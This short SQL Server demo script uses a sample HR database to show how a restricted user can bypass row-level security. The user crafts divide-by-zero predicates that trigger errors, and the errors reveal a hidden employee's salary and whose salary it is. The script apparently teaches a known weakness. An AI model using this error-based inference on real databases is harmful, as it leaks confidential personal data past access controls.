-- 5/6/2017 by Allison Benneth (allison at sqltran dot org)
-- Feel free to use in any way you would like.

use CompanyHR;
go

-- However, some information can be leaked.
-- Note one person's salary:
select * from dbo.Employee where LoginName = 'cfloyd';

-- User 'jellis' cannot see this record:
execute as user = 'jellis';  -- Customer service employee
select * from dbo.Employee where LoginName = 'cfloyd';
revert;

-- But with a carefully crafted predicate we get some information.
execute as user = 'jellis';  -- Customer service employee
select * from dbo.Employee where 1.0 / (Salary - 90731.00) = 0;
revert;
-- No record returned, but:
-- Msg 8134, Level 16, State 1, Line 132
-- Divide by zero error encountered.

-- Then we can start to eliminate who it is.
execute as user = 'jellis';  -- Customer service employee
select * from dbo.Employee where LoginName = 'lstapleton' and 1.0 / (Salary - 90731.00) = 0;
select * from dbo.Employee where LoginName = 'sscott' and 1.0 / (Salary - 90731.00) = 0;
select * from dbo.Employee where LoginName = 'tkidd' and 1.0 / (Salary - 90731.00) = 0;
select * from dbo.Employee where LoginName = 'cfloyd' and 1.0 / (Salary - 90731.00) = 0;
revert;
